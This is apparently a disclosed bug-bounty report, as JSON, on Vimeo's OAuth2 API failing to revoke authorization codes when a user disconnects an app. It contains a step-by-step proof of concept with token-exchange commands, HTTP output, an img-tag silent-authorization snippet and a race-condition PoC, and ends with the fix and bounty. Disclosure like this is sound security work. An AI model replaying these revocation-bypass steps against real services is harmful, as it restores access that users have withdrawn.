{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "axolotl", 
        "webtrack"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 57603, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-05-01T17:39:39.799Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "API: missing invalidation of OAuth2 Authorization Code during access revocation causes authorization bypass", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2015-05-31T17:40:03.386Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "attachments": [
        {
            "file_name": "getAccessToken.sh.txt", 
            "type": "text/x-shellscript", 
            "id": 35603, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/035/603/d757f905c14ffd7a97358c6d9d744e4050c3e1cd/getAccessToken.sh.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230042Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9ac2e1cf51905c4ce1b0bc8fb3394c590d2d0bc66be3996d143c17b0433855aa"
        }, 
        {
            "file_name": "me.sh.txt", 
            "type": "text/x-shellscript", 
            "id": 35604, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/035/604/0c0c5d2ac149868c9732fca6431dfaf7d37bc29f/me.sh.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230042Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6aef777b1a27eee4b46e7156c778f123242bbc58f4be70fdc065d6b56ec786b4"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-04-24T21:22:44.132Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-24T21:22:44.132Z", 
            "actor": {
                "username": "dashron", 
                "url": "/dashron", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "I've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token. \n\nWhen I try your steps (using your very curl commands, but newly created app credentials on a new user), step 12 returns a 400 error with the body\n\n{\n    \"error\": \"invalid_request\",\n    \"error_description\": \"Invalid authorization code\"\n}.\n\n\nDo you have a more-streamlined process that reproduces this error? We don't support approval_prompt=auto, so you can leave that whole section out.", 
            "markdown_message": "<p>I&#39;ve been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token. </p>\n\n<p>When I try your steps (using your very curl commands, but newly created app credentials on a new user), step 12 returns a 400 error with the body</p>\n\n<p>{<br>\n    &quot;error&quot;: &quot;invalid_request&quot;,<br>\n    &quot;error_description&quot;: &quot;Invalid authorization code&quot;<br>\n}.</p>\n\n<p>Do you have a more-streamlined process that reproduces this error? We don&#39;t support approval_prompt=auto, so you can leave that whole section out.</p>\n", 
            "type": "Activities::Comment", 
            "id": 389698, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/036/071/b88b5c26027dfe89243eb4d9a3cd499315e2ee36/accessTokenRaceConditionPOC.sh.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230042Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=894b972bd43553de3a24e4d74681b93a0e666b1429f7aca04b056ba124980666", 
                    "type": "text/x-shellscript", 
                    "id": 36071, 
                    "filename": "accessTokenRaceConditionPOC.sh.txt"
                }
            ], 
            "automated_response": false, 
            "created_at": "2015-04-25T14:46:24.047Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-25T14:46:24.047Z", 
            "actor": {
                "username": "dor1s", 
                "url": "/dor1s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/930/da6461e494c2c33aa729348651e58eff4eb75727_medium.gif?1426012619"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "Hi dashron,\n\nThanks for the reply. Excuse me, but are you sure that while reproducing step 12 you are using `code` value from step 8?\nI think there is no more-streamlined process. Simplified idea of the PoC is:\nIf an application got additional `code` value, it may obtain `access_code` even after access revocation by user.\n\nI just repeated steps 6-13 several times and `code` was always valid for me. However I can record a screencast for the Proof of Concept.\n\nIt is good that you do not support `approval_prompt=auto`, let's ignore Note 2 on step 7.\n\n*Notice*\nYou just said that:\n```\nI've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token.\n```\n\nActually it is not exactly so. There you have Race Condition bug for exchanging `code` for `access_token`. One `code` value may be exchanged for several `access_token` values and all of them would be valid.\nYou can reproduce it with script attached. Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it.\nI did not reported Race Condition as separate bug, because there is no serious impact to security (when access is revoked, all `access_token` values become invalid). But such behavior violates OAuth2 RFC:\n1) [https://tools.ietf.org/html/rfc6749#section-4.1.2](https://tools.ietf.org/html/rfc6749#section-4.1.2) :\n```\n                        If an authorization code is used more than\n   once, the authorization server MUST deny the request and SHOULD\n   revoke (when possible) all tokens previously issued based on\n   that authorization code.  The authorization code is bound to\n   the client identifier and redirection URI.\n```\n2) [https://tools.ietf.org/html/rfc6749#section-10.5](https://tools.ietf.org/html/rfc6749#section-10.5) :\n```\n   Authorization codes MUST be short lived and single-use.  If the\n   authorization server observes multiple attempts to exchange an\n   authorization code for an access token, the authorization server\n   SHOULD attempt to revoke all access tokens already granted based on\n   the compromised authorization code.\n```\nand sometimes Race Condition may cause some logical flaws, so it would be better to fix too.", 
            "markdown_message": "<p>Hi dashron,</p>\n\n<p>Thanks for the reply. Excuse me, but are you sure that while reproducing step 12 you are using <code>code</code> value from step 8?<br>\nI think there is no more-streamlined process. Simplified idea of the PoC is:<br>\nIf an application got additional <code>code</code> value, it may obtain <code>access_code</code> even after access revocation by user.</p>\n\n<p>I just repeated steps 6-13 several times and <code>code</code> was always valid for me. However I can record a screencast for the Proof of Concept.</p>\n\n<p>It is good that you do not support <code>approval_prompt=auto</code>, let&#39;s ignore Note 2 on step 7.</p>\n\n<p><em>Notice</em><br>\nYou just said that:</p>\n<pre class=\"highlight plaintext\"><code>I&#39;ve been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token.\n</code></pre>\n<p>Actually it is not exactly so. There you have Race Condition bug for exchanging <code>code</code> for <code>access_token</code>. One <code>code</code> value may be exchanged for several <code>access_token</code> values and all of them would be valid.<br>\nYou can reproduce it with script attached. Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it.<br>\nI did not reported Race Condition as separate bug, because there is no serious impact to security (when access is revoked, all <code>access_token</code> values become invalid). But such behavior violates OAuth2 RFC:<br>\n1) <a href=\"/redirect?signature=bd1b22c06d5ebddfa1ecb38b49af3441ee202ee3&amp;url=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6749%23section-4.1.2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://tools.ietf.org/html/rfc6749#section-4.1.2</span><i class=\"icon-external-link\"></i></a> :</p>\n<pre class=\"highlight plaintext\"><code>                        If an authorization code is used more than\n   once, the authorization server MUST deny the request and SHOULD\n   revoke (when possible) all tokens previously issued based on\n   that authorization code.  The authorization code is bound to\n   the client identifier and redirection URI.\n</code></pre>\n<p>2) <a href=\"/redirect?signature=220633eacb2778d6d9e34370d04171f20037f9b5&amp;url=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6749%23section-10.5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://tools.ietf.org/html/rfc6749#section-10.5</span><i class=\"icon-external-link\"></i></a> :</p>\n<pre class=\"highlight plaintext\"><code>   Authorization codes MUST be short lived and single-use.  If the\n   authorization server observes multiple attempts to exchange an\n   authorization code for an access token, the authorization server\n   SHOULD attempt to revoke all access tokens already granted based on\n   the compromised authorization code.\n</code></pre>\n<p>and sometimes Race Condition may cause some logical flaws, so it would be better to fix too.</p>\n", 
            "type": "Activities::Comment", 
            "id": 390096, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-01T17:02:40.428Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-01T17:02:40.428Z", 
            "actor": {
                "username": "dashron", 
                "url": "/dashron", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "Oh I see now. Somehow I misread this at first as you could exchange an auth code for an access token twice.\nYou believe that the \"disconnect from <app>\" flow should also wipe out all authorization codes for that app.\n\nAdding that now.", 
            "markdown_message": "<p>Oh I see now. Somehow I misread this at first as you could exchange an auth code for an access token twice.<br>\nYou believe that the &quot;disconnect from &lt;app&gt;&quot; flow should also wipe out all authorization codes for that app.</p>\n\n<p>Adding that now.</p>\n", 
            "type": "Activities::Comment", 
            "id": 399387, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "dor1s", 
                "url": "/dor1s"
            }, 
            "created_at": "2015-05-01T17:39:22.451Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-01T17:39:22.451Z", 
            "actor": {
                "username": "andrewp", 
                "url": "/andrewp", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/966/575f2fca2c5e6e8cf46f8e20150417f9b8b1e07e_medium.jpeg?1415663814"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "This should be fixed now, thanks for such a through report!", 
            "markdown_message": "<p>This should be fixed now, thanks for such a through report!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 399395, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-05-01T17:39:29.602Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-01T17:39:29.602Z", 
            "actor": {
                "url": "/vimeo", 
                "profile": {
                    "name": "Vimeo"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/056/5cb7c3ee4ca70b64963e311c6f5cd8fb4a1daed9_medium.png?1393009870"
                }
            }, 
            "team_handle": "vimeo", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "dor1s", 
                "url": "/dor1s"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 399396, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-01T17:40:02.864Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-01T17:40:02.864Z", 
            "actor": {
                "username": "andrewp", 
                "url": "/andrewp", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/966/575f2fca2c5e6e8cf46f8e20150417f9b8b1e07e_medium.jpeg?1415663814"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 399399, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-31T17:40:10.099Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-31T17:40:10.099Z", 
            "actor": {
                "url": "/vimeo", 
                "profile": {
                    "name": "Vimeo"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/056/5cb7c3ee4ca70b64963e311c6f5cd8fb4a1daed9_medium.png?1393009870"
                }
            }, 
            "team_handle": "vimeo", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 434445, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-24T08:35:01.975Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-24T08:35:01.975Z", 
            "actor": {
                "username": "dor1s", 
                "url": "/dor1s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/930/da6461e494c2c33aa729348651e58eff4eb75727_medium.gif?1426012619"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "Hi Vimeo,\n\nThank you for listing my name in Hall of Fame at your web-site: [https://vimeo.com/about/security](https://vimeo.com/about/security).\n\nBu there is a little typo \"Max (dors1)\". May I ask you to change my name to \"Max Moroz\" there?\n\nThanks a lot!\n\n--\nMax", 
            "markdown_message": "<p>Hi Vimeo,</p>\n\n<p>Thank you for listing my name in Hall of Fame at your web-site: <a href=\"/redirect?signature=0d9a92e0bccf295655f171c56964187f208055f6&amp;url=https%3A%2F%2Fvimeo.com%2Fabout%2Fsecurity\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vimeo.com/about/security</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>Bu there is a little typo &quot;Max (dors1)&quot;. May I ask you to change my name to &quot;Max Moroz&quot; there?</p>\n\n<p>Thanks a lot!</p>\n\n<p>--<br>\nMax</p>\n", 
            "type": "Activities::Comment", 
            "id": 489649, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-25T15:56:10.859Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-25T15:56:10.859Z", 
            "actor": {
                "username": "dashron", 
                "url": "/dashron", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "Fixing it now!", 
            "markdown_message": "<p>Fixing it now!</p>\n", 
            "type": "Activities::Comment", 
            "id": 491614, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-25T16:43:00.278Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-25T16:43:00.278Z", 
            "actor": {
                "username": "dor1s", 
                "url": "/dor1s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/930/da6461e494c2c33aa729348651e58eff4eb75727_medium.gif?1426012619"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "vimeo", 
            "message": "Awesome, thanks!", 
            "markdown_message": "<p>Awesome, thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 491676, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "dor1s", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/dor1s", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/930/1029bebd9cfbbd6a5c813b6ca0c9518c560ca8d5_small.gif?1426012619"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 27, 
        "name": "Improper Authentication - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -111043238.9415559, 
    "disclosed_at": "2015-05-31T17:40:09.964Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/57603", 
    "created_at": "2015-04-21T14:44:49.464Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications&#39; access to their accounts and may deny access for any application. When some user denies access for the application, all <code>access_token</code>s are being revoked and become invalid. But not only <code>access_token</code>s should be revoked, authorization <code>code</code>s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization <code>code</code> during access revocation. It may be exploited to restore access to user&#39;s account by malicious application after access revocation.</p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p><em>(all scripts used are attached)</em></p>\n\n<p>1) Open the link for OAuth2 authorization for some application. Example link for my test application (<strong>Dor1s Test1</strong>, feel free to use my test application to reproduce the issue):</p>\n<pre class=\"highlight plaintext\"><code>https://api.vimeo.com/oauth/authorize?response_type=code&amp;client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&amp;redirect_uri=https://avuln.com/callback&amp;scope=public&amp;state=0123456789abcdef\n</code></pre>\n<p>2) Log into your Vimeo account (if needed) and click <strong>Allow</strong><br>\n3) Copy <code>code</code> value from callback url, for example:</p>\n<pre class=\"highlight plaintext\"><code>https://avuln.com/callback?state=0123456789abcdef&amp;code=e1fa87cd449ae55b74445b31ac79450c14eeb657\n</code></pre>\n<p><code>code</code> value is <code>e1fa87cd449ae55b74445b31ac79450c14eeb657</code><br>\n4) Use <code>code</code> value to obtain <code>access_token</code>:</p>\n<pre class=\"highlight plaintext\"><code>doris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657\n{\n    &quot;access_token&quot;: &quot;d3ac3bb53d1c4ebc3de7d28e4ed801c0&quot;,\n    &quot;token_type&quot;: &quot;bearer&quot;,\n    &quot;scope&quot;: &quot;public private&quot;,\n    &quot;user&quot;: {\n        &quot;uri&quot;: &quot;/users/39285903&quot;,\n&lt;... CUT OUT ... &gt;\n}\n</code></pre>\n<p>5) Check validity of <code>access_token</code>:</p>\n<pre class=\"highlight plaintext\"><code>doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\nHTTP/1.1 200 OK\nDate: Tue, 21 Apr 2015 14:10:29 GMT\nServer: nginx\nContent-Type: application/vnd.vimeo.user+json\nCache-Control: no-cache, max-age=315360000\nExpires: Fri, 18 Apr 2025 14:10:29 GMT\nContent-Length: 2930\nAccept-Ranges: bytes\nVia: 1.1 varnish\nAge: 0\nX-Served-By: cache-fra1239-FRA\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1429625429.334602,VS0,VE203\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\n\n{\n    &quot;uri&quot;: &quot;/users/39285903&quot;,\n&lt; ... CUT OUT ... &gt;\n}\n</code></pre>\n<p>6) Repeat step 1. Link for my test application:</p>\n<pre class=\"highlight plaintext\"><code>https://api.vimeo.com/oauth/authorize?response_type=code&amp;client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&amp;redirect_uri=https://avuln.com/callback&amp;scope=public&amp;state=0123456789abcdef\n</code></pre>\n<p>7) Repeat step 2. Log into your accounts (if needed) and click <strong>Allow</strong>.<br>\n<em>Note:</em> it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.</p>\n\n<p><em>Note 2:</em> often OAuth providers allow to use <code>approval_prompt=auto</code> parameter, which makes this step does not require user to click <strong>Allow</strong> again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;https://api.vimeo.com/oauth/authorize?response_type=code&amp;client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&amp;redirect_uri=https://avuln.com/callback&amp;scope=public&amp;state=0123456789abcdef&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>such code will &quot;silently&quot; produce new <code>access_token</code> value to callback each time it has been loaded by the user.</p>\n\n<p>8) Copy <code>code</code> value from callback url and save it for future usage:</p>\n<pre class=\"highlight plaintext\"><code>https://avuln.com/callback?state=0123456789abcdef&amp;code=82e24f835184f47cd83f249907e7bd5018bf62c9\n</code></pre>\n<p><code>code</code> value is <code>82e24f835184f47cd83f249907e7bd5018bf62c9</code></p>\n\n<p>9) Go to account security settings <a href=\"/redirect?signature=5af5c7d9886d9225b54b70f0df9709c5eb58c747&amp;url=https%3A%2F%2Fvimeo.com%2Fsettings%2Fapps\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vimeo.com/settings/apps</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>10) <strong>Disconnect</strong> the application (<strong>Dor1s Test1</strong> if my test application used) from <strong>Apps</strong> section</p>\n\n<p>11) To ensure that access is denied, repeat step 5:</p>\n<pre class=\"highlight plaintext\"><code>doris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\nHTTP/1.1 401 Authorization Required\nDate: Tue, 21 Apr 2015 14:23:55 GMT\nServer: nginx\nContent-Type: application/vnd.vimeo.error+json\nCache-Control: no-cache, max-age=315360000\nWWW-Authenticate: Bearer error=&quot;invalid_token&quot;\nExpires: Fri, 18 Apr 2025 14:23:55 GMT\nContent-Length: 53\nAccept-Ranges: bytes\nVia: 1.1 varnish\nX-Served-By: cache-fra1245-FRA\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1429626235.146346,VS0,VE105\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\n\n{\n    &quot;error&quot;: &quot;A valid user token must be passed.&quot;\n}\n</code></pre>\n<p>12) Use <code>code</code> value from step 8 and exchange it for <code>access_token</code>:</p>\n<pre class=\"highlight plaintext\"><code>doris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9\n{\n    &quot;access_token&quot;: &quot;9eabdc746910ea39c07395ee1b69a2b9&quot;,\n    &quot;token_type&quot;: &quot;bearer&quot;,\n    &quot;scope&quot;: &quot;public private&quot;,\n    &quot;user&quot;: {\n        &quot;uri&quot;: &quot;/users/39285903&quot;,\n&lt;... CUT OUT ...&gt;\n}\n</code></pre>\n<p>13) Check validity of <code>access_token</code>:</p>\n<pre class=\"highlight plaintext\"><code>doris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9\nHTTP/1.1 200 OK\nDate: Tue, 21 Apr 2015 14:25:41 GMT\nServer: nginx\nContent-Type: application/vnd.vimeo.user+json\nCache-Control: no-cache, max-age=315360000\nExpires: Fri, 18 Apr 2025 14:25:41 GMT\nContent-Length: 2930\nAccept-Ranges: bytes\nVia: 1.1 varnish\nAge: 0\nX-Served-By: cache-fra1235-FRA\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1429626341.087757,VS0,VE201\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\n\n{\n    &quot;uri&quot;: &quot;/users/39285903&quot;,\n&lt;... CUT OUT ...&gt;\n}\n</code></pre>\n<h1 id=\"impact\">Impact</h1>\n\n<p>The vulnerability allows an malicious application to keep its access active to a victim&#39;s account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.</p>\n\n<h1 id=\"mitigation\">Mitigation</h1>\n\n<p>For access revocation processing all authorization <code>code</code> issued for certain pair of user and application should be invalidated (as it currently being done for <code>access_token</code> values).</p>\n", 
    "vulnerability_information": "OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all `access_token`s are being revoked and become invalid. But not only `access_token`s should be revoked, authorization `code`s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization `code` during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.\r\n\r\nProof of Concept\r\n==============\r\n*(all scripts used are attached)*\r\n\r\n1) Open the link for OAuth2 authorization for some application. Example link for my test application (**Dor1s Test1**, feel free to use my test application to reproduce the issue):\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\r\n```\r\n2) Log into your Vimeo account (if needed) and click **Allow**\r\n3) Copy `code` value from callback url, for 